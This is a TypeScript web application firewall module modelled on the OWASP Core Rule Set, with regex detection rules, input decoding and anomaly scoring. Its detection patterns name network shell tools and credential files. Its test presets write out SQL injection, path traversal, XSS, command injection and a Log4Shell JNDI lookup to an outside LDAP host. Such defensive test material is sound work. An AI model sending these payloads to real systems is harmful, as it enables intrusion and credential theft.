// Request inspection modelled on the OWASP Core Rule Set at paranoia level 1.
// Each rule carries the CRS rule id it is modelled on, runs after the same kind of
// transformations CRS applies (repeated URL decoding, HTML entity decoding, comment
// removal, lower casing, whitespace compression) and adds to an inbound anomaly score.
// The request is blocked when the score reaches the threshold, exactly like CRS.

export type WafSeverity = "CRITICAL" | "ERROR" | "WARNING" | "NOTICE";
const SCORE: Record<WafSeverity, number> = { CRITICAL: 5, ERROR: 4, WARNING: 3, NOTICE: 2 };

export interface WafRequest {
  method: string;
  uri: string;
  body?: string;
  userAgent?: string;
  srcIp?: string;
}

export interface WafMatch {
  id: string;
  msg: string;
  severity: WafSeverity;
  score: number;
  target: string;
  matched: string;
  family: string;
}

export interface WafResult {
  action: "allow" | "block" | "log";
  score: number;
  threshold: number;
  matches: WafMatch[];
  normalized: { target: string; value: string }[];
}

type Target = "ARGS" | "ARGS_NAMES" | "REQUEST_FILENAME" | "REQUEST_BODY" | "USER_AGENT";

interface WafRule {
  id: string;
  msg: string;
  family: string;
  severity: WafSeverity;
  targets: Target[];
  pattern: RegExp;
}

export const WAF_RULES: WafRule[] = [
  { id: "913100", family: "Scanner detection", msg: "Found User Agent associated with security scanner", severity: "CRITICAL", targets: ["USER_AGENT"], pattern: /\b(sqlmap|nikto|nuclei|wpscan|gobuster|dirbuster|masscan|zgrab|acunetix|nessus)\b/ },
  { id: "920320", family: "Protocol enforcement", msg: "Missing User Agent header", severity: "NOTICE", targets: ["USER_AGENT"], pattern: /^$/ },
  { id: "930100", family: "Path traversal", msg: "Path Traversal Attack (/../)", severity: "CRITICAL", targets: ["ARGS", "REQUEST_FILENAME", "REQUEST_BODY"], pattern: /(?:^|[\\/])\.\.(?:[\\/]|$)/ },
  { id: "930120", family: "Local file inclusion", msg: "OS File Access Attempt", severity: "CRITICAL", targets: ["ARGS", "REQUEST_FILENAME", "REQUEST_BODY"], pattern: /(?:etc\/(?:passwd|shadow|hosts|group)|proc\/self\/(?:environ|cmdline)|win\.ini|boot\.ini|\.ssh\/id_rsa|\.env\b|wp-config\.php)/ },
  { id: "932100", family: "Remote command execution", msg: "Remote Command Execution: Unix Command Injection", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /(?:[;|&`]|\$\(|\|\|)\s*(?:id|whoami|uname|cat|wget|curl|nc|ncat|bash|sh|ping|ls|chmod|python3?|perl)\b/ },
  { id: "932110", family: "Remote command execution", msg: "Remote Command Execution: Windows Command Injection", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /(?:[;|&]|\|\|)\s*(?:cmd(?:\.exe)?\s*\/c|powershell(?:\.exe)?|net\s+user|type\s+c:|certutil)/ },
  { id: "933100", family: "PHP injection", msg: "PHP Injection Attack: PHP Open Tag or Wrapper Found", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /(?:<\?(?:php|=)|php:\/\/(?:input|filter)|phar:\/\/|data:\/\/text\/plain;base64)/ },
  { id: "934110", family: "Server side request forgery", msg: "Possible SSRF: cloud metadata or loopback target", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /(?:169\.254\.169\.254|metadata\.google\.internal|(?:localhost|127\.0\.0\.1):\d{2,5})/ },
  { id: "941100", family: "Cross site scripting", msg: "XSS Attack Detected via libinjection style signature", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY", "ARGS_NAMES"], pattern: /(?:<script[\s>\/]|javascript:|\bon(?:error|load|mouseover|focus|click|toggle)\s*=|<svg[\s\/]|<img[^>]+\bsrc\s*=|<body[^>]+onload)/ },
  { id: "941160", family: "Cross site scripting", msg: "NoScript XSS InjectionChecker: HTML Injection", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /<(?:iframe|object|embed|applet|meta|base|form)[\s>\/]/ },
  { id: "942100", family: "SQL injection", msg: "SQL Injection Attack: UNION based query", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /\bunion\s+(?:all\s+|distinct\s+)?select\b/ },
  { id: "942130", family: "SQL injection", msg: "SQL Injection Attack: SQL Tautology Detected", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /['"`)\d]\s*(?:or|and|\|\||&&)\s*['"`(]?\s*([\w'"]+)\s*['"`]?\s*(?:=|like)\s*['"`]?\s*\1/ },
  { id: "942140", family: "SQL injection", msg: "SQL Injection Attack: Common DB Names Detected", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /\b(?:information_schema|pg_catalog|sysobjects|syscolumns|mysql\.user|sqlite_master)\b/ },
  { id: "942160", family: "SQL injection", msg: "Detects blind SQLi tests using sleep() or benchmark()", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY"], pattern: /\b(?:sleep\s*\(\s*\d|benchmark\s*\(|pg_sleep\s*\(|waitfor\s+delay\s+')/ },
  { id: "942440", family: "SQL injection", msg: "SQL Comment Sequence Detected", severity: "CRITICAL", targets: ["ARGS"], pattern: /['"]\s*(?:--|#|\/\*)/ },
  { id: "944150", family: "Java attack", msg: "Potential Remote Command Execution: Log4j / Log4Shell", severity: "CRITICAL", targets: ["ARGS", "REQUEST_BODY", "USER_AGENT", "REQUEST_FILENAME"], pattern: /\$\{\s*(?:jndi|\$\{lower:j\}ndi|env|sys)\s*:/ },
];

function urlDecode(value: string) {
  let out = value;
  for (let i = 0; i < 3; i += 1) {
    let next: string;
    try { next = decodeURIComponent(out.replace(/\+/g, " ")); } catch { next = out.replace(/%([0-9a-f]{2})/gi, (_, h: string) => String.fromCharCode(parseInt(h, 16))); }
    if (next === out) break;
    out = next;
  }
  return out;
}

const ENTITIES: Record<string, string> = { lt: "<", gt: ">", quot: '"', apos: "'", amp: "&", sol: "/", colon: ":", lpar: "(", rpar: ")" };

function htmlDecode(value: string) {
  return value
    .replace(/&#x([0-9a-f]+);?/gi, (_, h: string) => String.fromCharCode(parseInt(h, 16)))
    .replace(/&#(\d+);?/g, (_, d: string) => String.fromCharCode(Number(d)))
    .replace(/&([a-z]+);/gi, (m, n: string) => ENTITIES[n.toLowerCase()] ?? m);
}

export function normalize(value: string) {
  return htmlDecode(urlDecode(value))
    .replace(/\/\*[\s\S]*?\*\//g, " ")
    .replace(/\\/g, "/")
    .toLowerCase()
    .replace(/\s+/g, " ")
    .trim();
}

function parseQuery(query: string) {
  return query.split("&").filter(Boolean).map((pair) => {
    const idx = pair.indexOf("=");
    return idx < 0 ? { name: pair, value: "" } : { name: pair.slice(0, idx), value: pair.slice(idx + 1) };
  });
}

export function inspect(req: WafRequest, threshold = 5, mode: "blocking" | "detection" = "blocking"): WafResult {
  const [path, query = ""] = req.uri.split("?");
  const args = parseQuery(query);
  const values: Record<Target, string[]> = {
    ARGS: args.map((a) => normalize(a.value)),
    ARGS_NAMES: args.map((a) => normalize(a.name)),
    REQUEST_FILENAME: [normalize(path)],
    REQUEST_BODY: req.body ? [normalize(req.body)] : [],
    USER_AGENT: [(req.userAgent ?? "").toLowerCase()],
  };
  const matches: WafMatch[] = [];
  for (const rule of WAF_RULES) {
    for (const target of rule.targets) {
      const hit = values[target].map((v) => ({ v, m: rule.pattern.exec(v) })).find((x) => x.m);
      if (hit && hit.m) {
        matches.push({ id: rule.id, msg: rule.msg, severity: rule.severity, score: SCORE[rule.severity], target, matched: hit.m[0].slice(0, 80) || "(empty)", family: rule.family });
        break;
      }
    }
  }
  const score = matches.reduce((sum, m) => sum + m.score, 0);
  const normalized = (Object.keys(values) as Target[]).flatMap((t) => values[t].filter(Boolean).map((v) => ({ target: t, value: v })));
  const action = score >= threshold ? (mode === "blocking" ? "block" : "log") : "allow";
  return { action, score, threshold, matches, normalized };
}

export const WAF_PRESETS: { label: string; req: WafRequest }[] = [
  { label: "Normal product lookup", req: { method: "GET", uri: "/api/v1/products?id=42&sort=price", userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0" } },
  { label: "UNION based SQL injection", req: { method: "GET", uri: "/api/v1/products?id=12%20UNION%20SELECT%20username,password_hash%20FROM%20users--", userAgent: "Mozilla/5.0" } },
  { label: "Tautology login bypass", req: { method: "POST", uri: "/login", body: "user=admin'%20or%20'1'='1&pass=x", userAgent: "Mozilla/5.0" } },
  { label: "Double encoded traversal", req: { method: "GET", uri: "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", userAgent: "curl/8.5.0" } },
  { label: "Reflected XSS", req: { method: "GET", uri: "/search?q=%3Csvg%2Fonload%3Dalert(document.domain)%3E", userAgent: "Mozilla/5.0" } },
  { label: "Command injection", req: { method: "POST", uri: "/api/v1/ping", body: "host=8.8.8.8;cat%20/etc/passwd", userAgent: "python-requests/2.32" } },
  { label: "Log4Shell in user agent", req: { method: "GET", uri: "/", userAgent: "${jndi:ldap://192.0.2.44:1389/a}" } },
  { label: "sqlmap blind probe", req: { method: "GET", uri: "/api/v1/products?id=1%20AND%20SLEEP(5)", userAgent: "sqlmap/1.8.3#stable (https://sqlmap.org)" } },
];
